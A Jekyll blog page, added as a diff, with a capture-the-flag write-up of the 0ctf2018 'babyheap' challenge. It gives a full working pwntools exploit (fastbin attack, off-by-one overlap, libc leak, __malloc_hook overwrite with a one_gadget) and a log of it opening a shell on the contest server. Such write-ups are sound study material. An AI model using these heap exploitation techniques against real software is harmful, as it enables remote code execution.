@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>0ctf2018 babyheap | DoubleMice</title>
+<meta name="generator" content="Jekyll v3.7.3" />
+<meta property="og:title" content="0ctf2018 babyheap" />
+<meta name="author" content="DoubleMice" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="babyheap exploit method: leak heap_addr fastbin attack off-by-one overlap leak main_arena unsorted bin attack off-by-one overlap main_arena = unsorted bin - offset leak libc_base libc_base = main_arena - offset&#39; fastbin attack to control top_chunk top_chunk point to near __malloc_hook use one_gadget to rewrite __malloc_hook leak fastbin attack single link LIFO structure sizeof(A/B/C) = 0x30. free(A),free(B),free(C),then we get: A-&gt;fd = B B-&gt;fd = C C-&gt;fd = 0 off-by-one overlap chunk A,B,C overflow A to pollute the size area of B,then get B&#39; in C,build a fake chunk C&#39; to bypass the size check condition:SIZE(B)+SIZE(C)=SIZE(B&#39;)+SIZE(C&#39;) addition knowledge on x86-64,chunk alignment:0x?8 size area get 0x(?+1)0 chunk A is an unsorted bin,A-&gt;fd = A-&gt;bk = A_addr main_arena - certain offset = libc_base see cat /proc/pid/maps in shell or vmmap in peda to get libc_base,then offset = main_arena - libc_base exp #!/usr/bin/python -u # encoding: utf-8 from pwn import * import sys" />
+<meta property="og:description" content="babyheap exploit method: leak heap_addr fastbin attack off-by-one overlap leak main_arena unsorted bin attack off-by-one overlap main_arena = unsorted bin - offset leak libc_base libc_base = main_arena - offset&#39; fastbin attack to control top_chunk top_chunk point to near __malloc_hook use one_gadget to rewrite __malloc_hook leak fastbin attack single link LIFO structure sizeof(A/B/C) = 0x30. free(A),free(B),free(C),then we get: A-&gt;fd = B B-&gt;fd = C C-&gt;fd = 0 off-by-one overlap chunk A,B,C overflow A to pollute the size area of B,then get B&#39; in C,build a fake chunk C&#39; to bypass the size check condition:SIZE(B)+SIZE(C)=SIZE(B&#39;)+SIZE(C&#39;) addition knowledge on x86-64,chunk alignment:0x?8 size area get 0x(?+1)0 chunk A is an unsorted bin,A-&gt;fd = A-&gt;bk = A_addr main_arena - certain offset = libc_base see cat /proc/pid/maps in shell or vmmap in peda to get libc_base,then offset = main_arena - libc_base exp #!/usr/bin/python -u # encoding: utf-8 from pwn import * import sys" />
+<link rel="canonical" href="http://localhost:4000/pwn/2018/04/27/0ctf2018-babyheap.html" />
+<meta property="og:url" content="http://localhost:4000/pwn/2018/04/27/0ctf2018-babyheap.html" />
+<meta property="og:site_name" content="DoubleMice" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-04-27T15:39:26+08:00" />
+<script type="application/ld+json">
+{"description":"babyheap exploit method: leak heap_addr fastbin attack off-by-one overlap leak main_arena unsorted bin attack off-by-one overlap main_arena = unsorted bin - offset leak libc_base libc_base = main_arena - offset&#39; fastbin attack to control top_chunk top_chunk point to near __malloc_hook use one_gadget to rewrite __malloc_hook leak fastbin attack single link LIFO structure sizeof(A/B/C) = 0x30. free(A),free(B),free(C),then we get: A-&gt;fd = B B-&gt;fd = C C-&gt;fd = 0 off-by-one overlap chunk A,B,C overflow A to pollute the size area of B,then get B&#39; in C,build a fake chunk C&#39; to bypass the size check condition:SIZE(B)+SIZE(C)=SIZE(B&#39;)+SIZE(C&#39;) addition knowledge on x86-64,chunk alignment:0x?8 size area get 0x(?+1)0 chunk A is an unsorted bin,A-&gt;fd = A-&gt;bk = A_addr main_arena - certain offset \b= libc_base see cat /proc/pid/maps in shell or vmmap in peda to get libc_base,then offset = main_arena - libc_base exp #!/usr/bin/python -u # encoding: utf-8 from pwn import * import sys","author":{"@type":"Person","name":"DoubleMice"},"@type":"BlogPosting","url":"http://localhost:4000/pwn/2018/04/27/0ctf2018-babyheap.html","headline":"0ctf2018 babyheap","dateModified":"2018-04-27T15:39:26+08:00","datePublished":"2018-04-27T15:39:26+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/2018/04/27/0ctf2018-babyheap.html"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="DoubleMice" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">DoubleMice</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/aboutme.html">AboutMe</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">0ctf2018 babyheap</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2018-04-27T15:39:26+08:00" itemprop="datePublished">Apr 27, 2018
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">DoubleMice</span></span></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2><a name="babyheap">babyheap</a></h2>
+<p>exploit method:</p>
+<ol>
+<li>leak heap_addr
+<ul>
+<li>fastbin attack</li>
+<li>off-by-one overlap</li>
+</ul>
+</li>
+<li>leak main_arena
+<ul>
+<li>unsorted bin attack</li>
+<li>off-by-one overlap</li>
+<li>main_arena = unsorted bin - offset</li>
+</ul>
+</li>
+<li>leak libc_base
+<ul>
+<li>libc_base = main_arena - offset'</li>
+</ul>
+</li>
+<li>fastbin attack to control top_chunk
+<ul>
+<li>top_chunk point to near __malloc_hook</li>
+</ul>
+</li>
+<li>use one_gadget to rewrite __malloc_hook</li>
+</ol>
+<h3>leak</h3>
+<p>fastbin attack</p>
+<ul>
+<li>single link</li>
+<li>LIFO</li>
+<li>structure<br />
+sizeof(A/B/C) = 0x30.<br />
+free(A),free(B),free(C),then we get:<br />
+A->fd = B<br />
+B->fd = C<br />
+C->fd = 0</li>
+</ul>
+<p>off-by-one overlap</p>
+<ul>
+<li>chunk A,B,C</li>
+<li>overflow A to pollute the size area of B,then get B'</li>
+<li>in C,build a fake chunk C' to bypass the size check<br />
+condition:<code>SIZE(B)+SIZE(C)=SIZE(B')+SIZE(C')</code></li>
+</ul>
+<p>addition knowledge</p>
+<ul>
+<li>on x86-64,chunk alignment:0x?8 size area get 0x(?+1)0</li>
+<li>chunk A is an unsorted bin,A->fd = A->bk = A_addr</li>
+<li>main_arena - certain offset = libc_base<br />
+see <code>cat /proc/pid/maps</code> in shell or <code>vmmap</code> in peda to get libc_base,then offset = main_arena - libc_base</li>
+</ul>
+<h3>exp</h3>
+<pre><code class="python">#!/usr/bin/python -u
+# encoding: utf-8
+from pwn import *
+import sys
+
+# context(log_level='debug')
+
+
+def allocate(size):
+    p.recvuntil('Command: ')
+    p.sendline('1')
+    p.recvuntil('Size: ')
+    p.sendline(str(size))
+
+def update(id,size,content):
+    p.recvuntil('Command: ')
+    p.sendline('2')
+    p.recvuntil('Index: ')
+    p.sendline(str(id))
+    p.recvuntil('Size: ')
+    p.sendline(str(size))
+    p.recvuntil('Content: ')
+    print "[#]update chunk:",str(id)
+    p.sendline(content)
+
+def delete(id):
+    p.recvuntil('Command: ')
+    p.sendline('3')
+    p.recvuntil('Index: ')
+    print "[#]delete chunk:",str(id)
+    p.sendline(str(id))
+
+def view(id):
+    p.recvuntil('Command: ')
+    p.sendline('4')
+    p.recvuntil('Index: ')
+    p.sendline(str(id))
+
+def redlog(msg):
+    return "[" + "<pre wp-pre-tag-0></pre>33[0;31m%s<pre wp-pre-tag-0></pre>33[0m" % "+" + "]" + msg + ":"
+
+
+
+
+def exploit(p):
+    allocate(0x10)
+    allocate(0x28)
+    allocate(0x20)#2
+    allocate(0x20)
+
+    #leak heap
+    update(1,0x29,'a'*0x28+'\x51')
+    update(3,0x20,p64(1)+p64(1)+p64(0)+p64(0x21))
+
+    delete(2)
+    allocate(0x40)#2
+    update(2,0x30,'a'*0x20+p64(-1,sign=signed)+p64(0x21))
+    delete(0)
+    delete(3)
+    view(2)
+    p.recvuntil(": ")
+    data=p.recvuntil("\n")[0x30:][:8]
+    heap=u64(data)
+    print redlog("heap"),hex(heap)
+
+    # leak main_arena
+    allocate(0x10) #0
+    allocate(0x58) #3
+    allocate(0x58) #4
+
+
+    update(2,0x30,'A'*0X20+p64(0)+p64(0X91))
+    update(3,0x51,p64(0xdeadbeef)*11 + p64(0x21))
+
+    delete(0)
+    view(2)
+    p.recvuntil(": ")
+    data=p.recvuntil("\n")[0x30:][:8]
+    main_arena = u64(data)-0x58
+    libc_offset = 0x399b00
+    libc = main_arena - libc_offset
+    print redlog("main_arena"),hex(main_arena)
+    print redlog("libc_offset"),hex(libc_offset)
+    print redlog("libc"),hex(libc)
+
+    # control top_chunk
+    allocate(0x58) #0
+    allocate(0x28) #5
+    allocate(0x58)
+    # update(5,0x10,p64(0)+p64(0x41))
+    update(2,0x30,p64(0xdeadbeef)*4+p64(0)+p64(0x51))
+    update(0,0x50,p64(0xdeadbeef)*8+p64(0)+p64(0x41))
+    # update(4,0x10,'\x44'*0x10)
+    update(5,0x29,p64(0xdeadbeef)*5+chr(0x51))
+    update(4,0x50,p64(0xdeadbeef)*8+p64(0)+p64(0x71))
+    delete(4)
+    delete(0)
+    delete(6)
+
+    # edit top_chunk
+    fake = main_arena + 37
+    fake_top = main_arena - 0x33
+    update(2,0x40,p64(0xdeadbeef)*5+p64(0x51)+p64(fake)+p64(0xdeadbeef))
+    allocate(0x10) #0
+    allocate(0x48) #4
+    # gdb.attach(p)
+    allocate(0x48) #6
+    update(6,0x33-8,'\x00'*3+p64(0xcafebabe)*4+p64(fake_top))
+    one_gadget = libc+0x3f35a
+    print redlog("one_gadget:"),hex(one_gadget)
+    allocate(0x30) #7
+    update(7,0x20,"\x33"*3+p64(0xdeadbeef)*2+p64(one_gadget)+p64(0xdeadbeef))
+    # gdb.attach(p)
+    allocate(0x10)
+    p.interactive()
+
+    p.close()
+
+
+if __name__=="__main__":
+    if len(sys.argv)<2 :
+        p = process("./babyheap")
+        # p = process('./babyheap',env={'LD_PRELOAD':'./libc.so'})
+    else:
+        p = remote(sys.argv[1],int(sys.argv[2]))
+    exploit(p)
+
+</code></pre>
+<pre><code>foxwest@ubuntu:~/Desktop/pwn/babyheap$ python o.py 202.120.7.204 127
+[+] Opening connection to 202.120.7.204 on port 127: Done
+[#]update chunk: 1
+[#]update chunk: 3
+[#]delete chunk: 2
+[#]update chunk: 2
+[#]delete chunk: 0
+[#]delete chunk: 3
+[+]heap: 0x5610e84a4000
+[#]update chunk: 2
+[#]update chunk: 3
+[#]delete chunk: 0
+[+]main_arena: 0x7ff07ed79b00
+[+]libc_offset: 0x399b00
+[+]libc: 0x7ff07e9e0000
+[#]update chunk: 2
+[#]update chunk: 0
+[#]update chunk: 5
+[#]update chunk: 4
+[#]delete chunk: 4
+[#]delete chunk: 0
+[#]delete chunk: 6
+[#]update chunk: 2
+[#]update chunk: 6
+[+]one_gadget:: 0x7ff07ea1f35a
+[#]update chunk: 7
+[*] Switching to interactive mode
+$ ls home/babyheap
+babyheap
+flag
+$ 
+</code></pre>
+
+  </div><a class="u-url" href="/pwn/2018/04/27/0ctf2018-babyheap.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">DoubleMice</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">DoubleMice</li><li><a class="u-email" href="mailto:foxwest@qq.com">foxwest@qq.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/DoubleMice"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">DoubleMice</span></a></li><li><a href="https://www.twitter.com/__Socrates"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">__Socrates</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
